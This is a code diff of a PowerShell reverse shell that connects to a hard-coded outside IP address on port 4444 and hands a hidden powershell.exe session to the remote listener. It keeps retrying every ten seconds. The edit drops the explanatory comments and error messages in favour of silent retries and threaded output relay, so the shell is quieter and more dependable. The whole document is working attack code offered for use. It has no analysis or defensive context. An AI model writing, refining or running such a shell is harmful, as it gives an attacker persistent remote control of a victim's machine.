@@ -1,75 +1,61 @@
-# Use a more robust reverse shell logic for a better interactive experience.
-# This script is a common and effective way to get a functional PowerShell session.
-
-# The IP address of your listener (VPS)
-$ip = "31.57.46.127"
-# The port your listener is running on
-$port = 4444
-
-# Keep trying to connect in a loop
 while ($true) {
     try {
-        # Create a TCP client object
-        $client = New-Object System.Net.Sockets.TCPClient
-        # Connect to your listener
-        $client.Connect($ip, $port)
-
+        $client = New-Object System.Net.Sockets.TCPClient("31.57.46.127", 4444)
         if ($client.Connected) {
-            # Get the network stream
             $stream = $client.GetStream()
-            
-            # Create objects to read from and write to the stream
-            $reader = New-Object System.IO.StreamReader($stream)
             $writer = New-Object System.IO.StreamWriter($stream)
-            
-            # Start a PowerShell process that will execute commands
+            $writer.AutoFlush = $true
+            $reader = New-Object System.IO.StreamReader($stream)
+
+            $psi = New-Object System.Diagnostics.ProcessStartInfo
+            $psi.FileName = "powershell.exe"
+            $psi.RedirectStandardInput = $true
+            $psi.RedirectStandardOutput = $true
+            $psi.RedirectStandardError = $true
+            $psi.UseShellExecute = $false
+            $psi.CreateNoWindow = $true
+
             $process = New-Object System.Diagnostics.Process
-            $process.StartInfo.FileName = "powershell.exe"
-            # Use arguments to prevent the process from creating a new window
-            $process.StartInfo.Arguments = "-NoExit -Command -"
-            # Redirect the input, output, and error streams
-            $process.StartInfo.UseShellExecute = $false
-            $process.StartInfo.RedirectStandardOutput = $true
-            $process.StartInfo.RedirectStandardError = $true
-            $process.StartInfo.RedirectStandardInput = $true
-            $process.Start()
+            $process.StartInfo = $psi
+            $process.Start() | Out-Null
 
-            # Create a script block to read from the remote stream and write to the PowerShell process's input
-            $in_stream = {
-                while ($true) {
-                    $cmd = $reader.ReadLine()
-                    $process.StandardInput.WriteLine($cmd)
+            $stdout = $process.StandardOutput
+            $stderr = $process.StandardError
+            $stdin = $process.StandardInput
+
+            # Async Output
+            $outputThread = [System.Threading.Thread]::new({
+                param ($out, $streamWriter)
+                while (($line = $out.ReadLine()) -ne $null) {
+                    $streamWriter.WriteLine($line)
                 }
+            }, @($stdout, $writer))
+            $errorThread = [System.Threading.Thread]::new({
+                param ($err, $streamWriter)
+                while (($line = $err.ReadLine()) -ne $null) {
+                    $streamWriter.WriteLine($line)
+                }
+            }, @($stderr, $writer))
+
+            $outputThread.IsBackground = $true
+            $errorThread.IsBackground = $true
+            $outputThread.Start()
+            $errorThread.Start()
+
+            # Input loop
+            while ($client.Connected -and -not $process.HasExited) {
+                $line = $reader.ReadLine()
+                if ($line -ne $null) {
+                    $stdin.WriteLine($line)
+                }
+                Start-Sleep -Milliseconds 100
             }
 
-            # Create a script block to read from the PowerShell process's output/error and write to the remote stream
-            $out_stream = {
-                while ($true) {
-                    # Read from both the output and error streams
-                    $output = $process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd()
-                    if ($output) {
-                        $writer.WriteLine($output)
-                        $writer.Flush()
-                    }
-                }
-            }
-            
-            # Start the input and output streams as jobs
-            $input_job = Start-Job -ScriptBlock $in_stream
-            $output_job = Start-Job -ScriptBlock $out_stream
-            
-            # Wait for the jobs to complete (this will effectively run forever)
-            Wait-Job -Job $input_job, $output_job
-            
-            # Clean up when the connection closes
+            $process.Close()
             $client.Close()
-            $process.Kill()
         }
     } catch {
-        # Log the error or silently ignore it
-        Write-Host "Error: $($_.Exception.Message)"
+        # Silently retry
     }
-    
-    # Wait 10 seconds before retrying the connection
     Start-Sleep -Seconds 10
 }
